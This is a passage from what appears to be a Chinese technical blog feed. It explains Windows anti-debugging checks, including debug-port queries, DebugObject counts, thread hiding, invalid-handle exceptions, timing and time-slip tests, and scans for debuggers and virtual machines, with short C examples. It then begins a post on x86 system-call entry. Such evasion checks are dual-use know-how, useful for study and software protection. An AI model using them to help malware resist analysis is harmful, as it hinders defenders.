class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSTATUS NtQueryInformationProcess(</span><br><span class="line">  [in]            HANDLE           ProcessHandle,</span><br><span class="line">  [in]            PROCESSINFOCLASS ProcessInformationClass,</span><br><span class="line">  [out]           PVOID            ProcessInformation,</span><br><span class="line">  [in]            ULONG            ProcessInformationLength,</span><br><span class="line">  [out, optional] PULONG           ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h5 id="ProcessDebugPort-0x07"><a href="#ProcessDebugPort-0x07" class="headerlink" title="ProcessDebugPort (0x07)"></a>ProcessDebugPort (0x07)</h5><p>EPROCESS-&gt;DebugPort:当调试器附加到进程时，系统会将调试器的端口对象地址填入被调试进程 <code>EPROCESS</code> 结构体的 <code>DebugPort</code> 字段中，如果返回的 <code>ProcessInformation</code>（即端口号）不为 0，程序就判定自己被调试了 。</p><h5 id="ProcessDebugObjectHandle-0x1E"><a href="#ProcessDebugObjectHandle-0x1E" class="headerlink" title="ProcessDebugObjectHandle (0x1E)"></a>ProcessDebugObjectHandle (0x1E)</h5><p>同样是检查 <code>EPROCESS-&gt;DebugPort</code>，调试器会为被调试的进程创建一个调试对象，该参数能获取调试对象的句柄,不为0则为调试。</p><h5 id="ProcessDebugFlags-0x1F"><a href="#ProcessDebugFlags-0x1F" class="headerlink" title="ProcessDebugFlags (0x1F)"></a>ProcessDebugFlags (0x1F)</h5><p>EPROCESS-&gt;FLAGS（NoDebugInherit比特位）<code>NoDebugInherit</code> 标志位用于指示子进程是否应该继承父进程的调试状态。</p><p>NtQueryInformationProcess函数的返回值为0，则正在调试进程。</p><h4 id="NtQuerySystemInformation"><a href="#NtQuerySystemInformation" class="headerlink" title="NtQuerySystemInformation"></a>NtQuerySystemInformation</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSTATUS NtQuerySystemInformation(</span><br><span class="line">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="line">  [in, out]       PVOID                    SystemInformation,</span><br><span class="line">  [in]            ULONG                    SystemInformationLength,</span><br><span class="line">  [out, optional] PULONG                   ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>读取内核变量 <code>KdDebuggerEnabled</code> 和 <code>KdPitchDebugger</code>，调试状态下 <code>SYSTEM_KERNEL_DEBUGGER_INFORMATION.DebuggerEnabled</code>值和 <code>KernelDebuggerNotPresent</code>值为1。这些内核变量的值会被映射到用户层可读的共享页面 KUSER_SHARED_DATA中，因此也可以读取该结构体</p><h5 id="内核KUSER-SHARED-DATA-结构体"><a href="#内核KUSER-SHARED-DATA-结构体" class="headerlink" title="内核KUSER_SHARED_DATA 结构体"></a>内核KUSER_SHARED_DATA 结构体</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">dt _KUSER_SHARED_DATA     // win11前</span><br><span class="line">nt!_KUSER_SHARED_DATA</span><br><span class="line">   +0x000 TickCountLowDeprecated : Uint4B</span><br><span class="line">   +0x004 TickCountMultiplier : Uint4B</span><br><span class="line">   +0x008 InterruptTime    : _KSYSTEM_TIME</span><br><span class="line">   +0x014 SystemTime       : _KSYSTEM_TIME</span><br><span class="line">   +0x020 TimeZoneBias     : _KSYSTEM_TIME</span><br><span class="line">   +0x02c ImageNumberLow   : Uint2B</span><br><span class="line">   +0x02e ImageNumberHigh  : Uint2B</span><br><span class="line">   +0x030 NtSystemRoot     : [260] Wchar</span><br><span class="line">   +0x238 MaxStackTraceDepth : Uint4B</span><br><span class="line">   +0x23c CryptoExponent   : Uint4B</span><br><span class="line">   +0x240 TimeZoneId       : Uint4B</span><br><span class="line">   +0x244 LargePageMinimum : Uint4B</span><br><span class="line">   +0x248 AitSamplingValue : Uint4B</span><br><span class="line">   +0x24c AppCompatFlag    : Uint4B</span><br><span class="line">   +0x250 RNGSeedVersion   : Uint8B</span><br><span class="line">   +0x258 GlobalValidationRunlevel : Uint4B</span><br><span class="line">   +0x25c TimeZoneBiasStamp : Int4B</span><br><span class="line">   +0x260 NtBuildNumber    : Uint4B</span><br><span class="line">   +0x264 NtProductType    : _NT_PRODUCT_TYPE</span><br><span class="line">   +0x268 ProductTypeIsValid : UChar</span><br><span class="line">   +0x269 Reserved0        : [1] UChar</span><br><span class="line">   +0x26a NativeProcessorArchitecture : Uint2B</span><br><span class="line">   +0x26c NtMajorVersion   : Uint4B</span><br><span class="line">   +0x270 NtMinorVersion   : Uint4B</span><br><span class="line">   +0x274 ProcessorFeatures : [64] UChar</span><br><span class="line">   +0x2b4 Reserved1        : Uint4B</span><br><span class="line">   +0x2b8 Reserved3        : Uint4B</span><br><span class="line">   +0x2bc TimeSlip         : Uint4B</span><br><span class="line">   +0x2c0 AlternativeArchitecture : _ALTERNATIVE_ARCHITECTURE_TYPE</span><br><span class="line">   +0x2c4 BootId           : Uint4B</span><br><span class="line">   +0x2c8 SystemExpirationDate : _LARGE_INTEGER</span><br><span class="line">   +0x2d0 SuiteMask        : Uint4B</span><br><span class="line">   +0x2d4 KdDebuggerEnabled : UChar                            // &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;  划重点 </span><br><span class="line">   +0x2d5 MitigationPolicies : UChar</span><br><span class="line">   +0x2d5 NXSupportPolicy  : Pos 0, 2 Bits</span><br><span class="line">   +0x2d5 SEHValidationPolicy : Pos 2, 2 Bits</span><br><span class="line">   +0x2d5 CurDirDevicesSkippedForDlls : Pos 4, 2 Bits</span><br><span class="line">   +0x2d5 Reserved         : Pos 6, 2 Bits</span><br><span class="line">   +0x2d6 Reserved6        : [2] UChar</span><br><span class="line">   +0x2d8 ActiveConsoleId  : Uint4B</span><br><span class="line">   +0x2dc DismountCount    : Uint4B</span><br><span class="line">   +0x2e0 ComPlusPackage   : Uint4B</span><br><span class="line">   +0x2e4 LastSystemRITEventTickCount : Uint4B</span><br><span class="line">   +0x2e8 NumberOfPhysicalPages : Uint4B</span><br><span class="line">   +0x2ec SafeBootMode     : UChar</span><br><span class="line">   +0x2ed VirtualizationFlags : UChar</span><br><span class="line">   +0x2ee Reserved12       : [2] UChar</span><br><span class="line">   +0x2f0 SharedDataFlags  : Uint4B</span><br><span class="line">   +0x2f0 DbgErrorPortPresent : Pos 0, 1 Bit</span><br><span class="line">   +0x2f0 DbgElevationEnabled : Pos 1, 1 Bit</span><br><span class="line">   +0x2f0 DbgVirtEnabled   : Pos 2, 1 Bit</span><br><span class="line">   +0x2f0 DbgInstallerDetectEnabled : Pos 3, 1 Bit</span><br><span class="line">   +0x2f0 DbgLkgEnabled    : Pos 4, 1 Bit</span><br><span class="line">   +0x2f0 DbgDynProcessorEnabled : Pos 5, 1 Bit</span><br><span class="line">   +0x2f0 DbgConsoleBrokerEnabled : Pos 6, 1 Bit</span><br><span class="line">   +0x2f0 DbgSecureBootEnabled : Pos 7, 1 Bit</span><br><span class="line">   +0x2f0 DbgMultiSessionSku : Pos 8, 1 Bit</span><br><span class="line">   +0x2f0 DbgMultiUsersInSessionSku : Pos 9, 1 Bit</span><br><span class="line">   +0x2f0 DbgStateSeparationEnabled : Pos 10, 1 Bit</span><br><span class="line">   +0x2f0 SpareBits        : Pos 11, 21 Bits</span><br><span class="line">   +0x2f4 DataFlagsPad     : [1] Uint4B</span><br><span class="line">   +0x2f8 TestRetInstruction : Uint8B</span><br><span class="line">   +0x300 QpcFrequency     : Int8B</span><br><span class="line">   +0x308 SystemCall       : Uint4B</span><br><span class="line">   +0x30c SystemCallPad0   : Uint4B</span><br><span class="line">   +0x310 SystemCallPad    : [2] Uint8B</span><br><span class="line">   +0x320 TickCount        : _KSYSTEM_TIME</span><br><span class="line">   +0x320 TickCountQuad    : Uint8B</span><br><span class="line">   +0x320 ReservedTickCountOverlay : [3] Uint4B</span><br><span class="line">   +0x32c TickCountPad     : [1] Uint4B</span><br><span class="line">   +0x330 Cookie           : Uint4B</span><br><span class="line">   +0x334 CookiePad        : [1] Uint4B</span><br><span class="line">   +0x338 ConsoleSessionForegroundProcessId : Int8B</span><br><span class="line">   +0x340 TimeUpdateLock   : Uint8B</span><br><span class="line">   +0x348 BaselineSystemTimeQpc : Uint8B</span><br><span class="line">   +0x350 BaselineInterruptTimeQpc : Uint8B</span><br><span class="line">   +0x358 QpcSystemTimeIncrement : Uint8B</span><br><span class="line">   +0x360 QpcInterruptTimeIncrement : Uint8B</span><br><span class="line">   +0x368 QpcSystemTimeIncrementShift : UChar</span><br><span class="line">   +0x369 QpcInterruptTimeIncrementShift : UChar</span><br><span class="line">   +0x36a UnparkedProcessorCount : Uint2B</span><br><span class="line">   +0x36c EnclaveFeatureMask : [4] Uint4B</span><br><span class="line">   +0x37c TelemetryCoverageRound : Uint4B</span><br><span class="line">   +0x380 UserModeGlobalLogger : [16] Uint2B</span><br><span class="line">   +0x3a0 ImageFileExecutionOptions : Uint4B</span><br><span class="line">   +0x3a4 LangGenerationCount : Uint4B</span><br><span class="line">   +0x3a8 Reserved4        : Uint8B</span><br><span class="line">   +0x3b0 InterruptTimeBias : Uint8B</span><br><span class="line">   +0x3b8 QpcBias          : Uint8B</span><br><span class="line">   +0x3c0 ActiveProcessorCount : Uint4B</span><br><span class="line">   +0x3c4 ActiveGroupCount : UChar</span><br><span class="line">   +0x3c5 Reserved9        : UChar</span><br><span class="line">   +0x3c6 QpcData          : Uint2B</span><br><span class="line">   +0x3c6 QpcBypassEnabled : UChar</span><br><span class="line">   +0x3c7 QpcShift         : UChar</span><br><span class="line">   +0x3c8 TimeZoneBiasEffectiveStart : _LARGE_INTEGER</span><br><span class="line">   +0x3d0 TimeZoneBiasEffectiveEnd : _LARGE_INTEGER</span><br><span class="line">   +0x3d8 XState           : _XSTATE_CONFIGURATION</span><br></pre></td></tr></table></figure><p>KUSER_SHARED_DATA-&gt;KdDebuggerEnabled</p><p>检查第 0 位（0x1）：如果为 1，表示内核调试器已启用；检查第1位(0x2)：如果为 0，表示调试器存在。</p><h4 id="NtQueryObject"><a href="#NtQueryObject" class="headerlink" title="NtQueryObject"></a>NtQueryObject</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSYSCALLAPI NTSTATUS NtQueryObject(</span><br><span class="line">  [in, optional]  HANDLE                   Handle,</span><br><span class="line">  [in]            OBJECT_INFORMATION_CLASS ObjectInformationClass,</span><br><span class="line">  [out, optional] PVOID                    ObjectInformation,</span><br><span class="line">  [in]            ULONG                    ObjectInformationLength,</span><br><span class="line">  [out, optional] PULONG                   ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h5 id="ObjectAllTypesInformation"><a href="#ObjectAllTypesInformation" class="headerlink" title="ObjectAllTypesInformation"></a>ObjectAllTypesInformation</h5><p>Windows 内核中每种对象（如文件、互斥体、调试对象）都有一个 <code>OBJECT_TYPE</code> 结构来描述。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_TYPE_INFORMATION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UNICODE_STRING TypeName;</span><br><span class="line">    ULONG TotalNumberOfObjects;</span><br><span class="line">    ULONG TotalNumberOfHandles;</span><br><span class="line">    ULONG TotalPagedPoolUsage;</span><br><span class="line">    ULONG TotalNonPagedPoolUsage;</span><br><span class="line">    ULONG TotalNamePoolUsage;</span><br><span class="line">    ULONG TotalHandleTableUsage;</span><br><span class="line">    ULONG HighWaterNumberOfObjects;</span><br><span class="line">    ULONG HighWaterNumberOfHandles;</span><br><span class="line">    ULONG HighWaterPagedPoolUsage;</span><br><span class="line">    ULONG HighWaterNonPagedPoolUsage;</span><br><span class="line">    ULONG HighWaterNamePoolUsage;</span><br><span class="line">    ULONG HighWaterHandleTableUsage;</span><br><span class="line">    ULONG InvalidAttributes;</span><br><span class="line">    GENERIC_MAPPING GenericMapping;</span><br><span class="line">    ULONG ValidAccessMask;</span><br><span class="line">    BOOLEAN SecurityRequired;</span><br><span class="line">    BOOLEAN MaintainHandleCount;</span><br><span class="line">    UCHAR TypeIndex; <span class="comment">// since WINBLUE</span></span><br><span class="line">    CHAR ReservedByte;</span><br><span class="line">    ULONG PoolType;</span><br><span class="line">    ULONG DefaultPagedPoolCharge;</span><br><span class="line">    ULONG DefaultNonPagedPoolCharge;</span><br><span class="line">&#125; OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;</span><br></pre></td></tr></table></figure><ul><li>API 逻辑 : 遍历所有对象类型，找到名称为 “DebugObject” 的类型结构。</li><li>判断依据 : 读取该类型结构下的 <code>TotalNumberOfObjects</code> 字段。</li><li>核心逻辑 : 只要有调试器在工作，它就必须创建一个DebugObject类型的内核对象。如果检测到该对象的数量 &gt; 0（或者大于你程序自己创建的数量），就说明系统中存在调试器。</li></ul><h5 id="ObjectTypeInformation"><a href="#ObjectTypeInformation" class="headerlink" title="ObjectTypeInformation"></a>ObjectTypeInformation</h5><p>NtCreateDebugObject创建一个调试对象句柄，然后再查询该调试对象类型的对象总数，&gt;1则说明有调试</p><h3 id="线程上下文检测"><a href="#线程上下文检测" class="headerlink" title="线程上下文检测"></a>线程上下文检测</h3><h4 id="NtQueryInformationThread或者GetThreadContext"><a href="#NtQueryInformationThread或者GetThreadContext" class="headerlink" title="NtQueryInformationThread或者GetThreadContext"></a>NtQueryInformationThread或者GetThreadContext</h4><p>检查 ETHREAD -&gt;KTHREAD -&gt; TrapFrame的Dr0~Dr7寄存器来判断硬件断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSTATUS NtQueryInformationThread(</span><br><span class="line">  [in]            HANDLE          ThreadHandle,</span><br><span class="line">  [in]            THREADINFOCLASS ThreadInformationClass,</span><br><span class="line">  [in, out]       PVOID           ThreadInformation,</span><br><span class="line">  [in]            ULONG           ThreadInformationLength,</span><br><span class="line">  [out, optional] PULONG          ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="NtSetInformationThread"><a href="#NtSetInformationThread" class="headerlink" title="NtSetInformationThread"></a>NtSetInformationThread</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTSYSAPI NTSTATUS ZwSetInformationThread(</span><br><span class="line">  [in] HANDLE          ThreadHandle,</span><br><span class="line">  [in] THREADINFOCLASS ThreadInformationClass,</span><br><span class="line">  [in] PVOID           ThreadInformation,</span><br><span class="line">  [in] ULONG           ThreadInformationLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>当调用 <code>NtSetInformationThread</code> 并传入 <code>ThreadHideFromDebugger</code> 时，内核将当前线程 <code>ETHREAD</code> 结构中的 <code>HideFromDebugger</code> (位于 <code>ETHREAD-&gt;ThreadFlags</code> 或 <code>CrossThreadFlags</code> 位域中)标志位置为 1。一旦置位，当该线程触发异常（如断点）时，内核会忽略调试器，直接将异常派发给进程自身处理。如果进程处理不了，程序就会崩溃（从而达到反调试目的）。</p><h3 id="异常捕获"><a href="#异常捕获" class="headerlink" title="异常捕获"></a>异常捕获</h3><p>利用“调试器会优先接管异常”的机制。如果程序自己制造一个异常，且成功捕获了它，说明没有调试器（或者调试器把异常透传了）；如果程序没捕获到或者行为异常，说明有调试器干扰。</p><h4 id="CloseHandle等"><a href="#CloseHandle等" class="headerlink" title="CloseHandle等"></a>CloseHandle等</h4><p>传入一个无效的句柄</p><ul><li><strong>有调试器</strong> : 会触发 <code>0xC0000008</code> (Invalid Handle) 异常，调试器通常会暂停。</li><li><strong>无调试器</strong> : 函数返回 <code>FALSE</code>，或者通过 <code>__except</code> 捕获异常继续运行。</li></ul><p>其他函数诸如NtGetContextThread、NtQueryInformationProcess、CloseWindow等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __try &#123;</span><br><span class="line">        CloseHandle((HANDLE)<span class="number">672368</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    __except(EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;debugger&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用 <code>SetHandleInformation</code>将互斥体句柄标记为“禁止关闭” (<code>HANDLE_FLAG_PROTECT_FROM_CLOSE</code>)，然后强行关闭它。</p><table><thead><tr><th>值</th><th>说明</th></tr></thead><tbody><tr><td>HANDLE_FLAG_PROTECT_FROM_CLOSE（0x2）</td><td>如果设置了此标志，则调用<a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/handleapi/nf-handleapi-closehandle">CloseHandle</a> 函数不会关闭对象句柄。</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">CheckCloseHandle2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> hMutex = CreateMutexA(<span class="literal">NULL</span>, FALSE, <span class="string">&quot;ntdil.dli&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_VALID_HANDLE(hMutex))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (SetHandleInformation(hMutex, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE))</span><br><span class="line">&#123;</span><br><span class="line">__try </span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hMutex);</span><br><span class="line">&#125;</span><br><span class="line">__except (HANDLE_FLAG_PROTECT_FROM_CLOSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="时间差检测"><a href="#时间差检测" class="headerlink" title="时间差检测"></a>时间差检测</h3><p>调试器的处理（中断、单步执行、异常处理）会消耗大量 CPU 周期。可以使用GetTickCount或者QueryPerformanceCounter、rdtsc指令</p><h4 id="rdtsc"><a href="#rdtsc" class="headerlink" title="rdtsc"></a>rdtsc</h4><p><code>rdtsc</code> 指令会将 CPU 上电以来的时钟周期数读取到寄存器（<code>EDX:EAX</code>）中。程序在执行一段指令前后分别调用两次 <code>rdtsc</code>，计算两次结果的差值</p><h4 id="NtSetSystemInformation-Time-Slip"><a href="#NtSetSystemInformation-Time-Slip" class="headerlink" title="NtSetSystemInformation (Time Slip)"></a>NtSetSystemInformation (Time Slip)</h4><p>创建一个事件对象，如果系统中存在内核调试器且处于中断状态，系统时钟会“滑移”（停止走动）。该函数可以检测这种滑移并触发事件。如果 <code>WaitForSingleObject</code> 等到了信号，说明发生了时钟滑移，即存在调试行为。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">CheckSystemTime</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> bRet = <span class="literal">false</span>;</span><br><span class="line">BOOLEAN bAdjustPrivRet;</span><br><span class="line"><span class="keyword">auto</span> ntStatus =RtlAdjustPrivilege(SE_SYSTEMTIME_PRIVILEGE, TRUE, FALSE, &amp;bAdjustPrivRet);</span><br><span class="line"><span class="keyword">if</span> (NT_SUCCESS(ntStatus))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> hEvent = CreateEventA(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_VALID_HANDLE(hEvent))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (NT_SUCCESS(NtSetSystemInformation(SystemTimeSlipNotification, &amp;hEvent, <span class="keyword">sizeof</span>(hEvent))))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (WaitForSingleObject(hEvent, <span class="number">1</span>) == WAIT_OBJECT_0) <span class="comment">//如果为有信号,说明进程处于中断状态</span></span><br><span class="line">bRet = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hEvent);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="环境与启动特征-Environment-Boot"><a href="#环境与启动特征-Environment-Boot" class="headerlink" title="环境与启动特征 (Environment &amp; Boot)"></a>环境与启动特征 (Environment &amp; Boot)</h3><h4 id="系统启动选项-SystemStartOptions"><a href="#系统启动选项-SystemStartOptions" class="headerlink" title="系统启动选项 (SystemStartOptions)"></a>系统启动选项 (SystemStartOptions)</h4><p>读取注册表 <code>HKLM\System\CurrentControlSet\Control\SystemStartOptions</code>。</p><p>检查字符串中是否包含 “DEBUG”。这通常意味着系统是以调试模式（如 <code>/DEBUG</code> 开关）启动的。</p><h4 id="窗口与进程扫描"><a href="#窗口与进程扫描" class="headerlink" title="窗口与进程扫描"></a>窗口与进程扫描</h4><p>使用 <code>FindWindow</code> 查找类名或标题为 “OllyDbg”, “x64dbg” 的窗口。</p><p>扫描进程列表（<code>CreateToolhelp32Snapshot</code>）查找 <code>VMWareService.exe</code> 等虚拟机进程（虚拟机常用于逆向分析）</p><h4 id="驱动-设备对象扫描"><a href="#驱动-设备对象扫描" class="headerlink" title="驱动&#x2F;设备对象扫描"></a>驱动&#x2F;设备对象扫描</h4><p>尝试打开特定的驱动设备名，如 <code>\\.\Syser</code> (Syser Debugger), <code>\\.\SICE</code> (SoftICE), <code>\\.\NtICE</code> 等。如果能成功打开句柄，说明由于反调试驱动存在。</p><h2 id="反沙箱"><a href="#反沙箱" class="headerlink" title="反沙箱"></a>反沙箱</h2>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows系统调用/对象管理/进程调度/内存管理/内核回调</title>
      <link href="/2025/12/30/2025-12-30-learning_windows_4/"/>
      <url>/2025/12/30/2025-12-30-learning_windows_4/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="系统调用syscall"><a href="#系统调用syscall" class="headerlink" title="系统调用syscall"></a>系统调用syscall</h2><h3 id="x86下R3-R0"><a href="#x86下R3-R0" class="headerlink" title="x86下R3-&gt;R0"></a>x86下R3-&gt;R0</h3><h4 id="int-2e"><a href="#int-2e" class="headerlink" title="int 2e"></a>int 2e</h4><p>CPU获取 IDT 的基地址，计算目标描述符地址：<code>IDT Base + (0x2e * 8)</code></p><p>进行特权级检查：CPL &lt;&#x3D; DPL</p><ul><li>CPL (Current Privilege Level) ：当前代码段（CS）的特权级（Ring 3）。</li><li>DPL (Descriptor Privilege Level) ：IDT 描述符中规定的特权级（必须是 3，否则用户态无权调用）</li></ul><p>从 IDT 描述符中提取段选择子 Segment Selector 。CPU 使用该 Selector 去查询 GDT</p><p>用户线程栈切换成内核线程栈，保存上下文 (Push Context，会压入一些寄存器)，从IDT（Interrupt Descriptor Table）中寻找0x2e对应的异常处理函数（KiSystemService）进入内核代码空间</p><h4 id="sysenter-sysreturn"><a href="#sysenter-sysreturn" class="headerlink" title="sysenter &#x2F; sysreturn"></a>sysenter &#x2F; sysreturn</h4><p>sysenter指令执行时会跳转到MSR[176]指向的函数地址（该函数实际是KiFastCallEntry），CS、SS、EIP、ESP均来自MSR寄存器，因此速度上比int 2e块（不需要压参数、读内存）</p><p>CS &lt;&#x3D;&#x3D; <code>IA32_SYSENTER_CS</code> (MSR 0x174)。</p><p>EIP &lt;&#x3D;&#x3D; <code>IA32_SYSENTER_EIP</code> (MSR 0x176)。</p><p>ESP &lt;&#x3D;&#x3D; <code>IA32_SYSENTER_ESP</code> (MSR 0x175)。</p><h4 id="KiFastCallEntry函数"><a href="#KiFastCallEntry函数" class="headerlink" title="KiFastCallEntry函数"></a>KiFastCallEntry函数</h4><p> <code>push 30h</code> &#x2F; <code>pop fs</code> FS 寄存器从用户态的  TEB 切换到内核态的 KPCR</p><p>0x30的二进制 ：<code>0000 0000 0011 0000</code></p><p>x86 段选择子的结构：</p><ul><li>RPL (最后2位) : <code>00</code> -&gt; Ring 0 (特权级 0，即内核态)。</li><li>TI (第3位) : <code>0</code> -&gt; GDT (全局描述符表)。</li><li>Index (高13位) : <code>0000000000110</code> -&gt; 6 (十进制)。</li></ul><h4 id="GDT全局描述表（Global-Description-Table）"><a href="#GDT全局描述表（Global-Description-Table）" 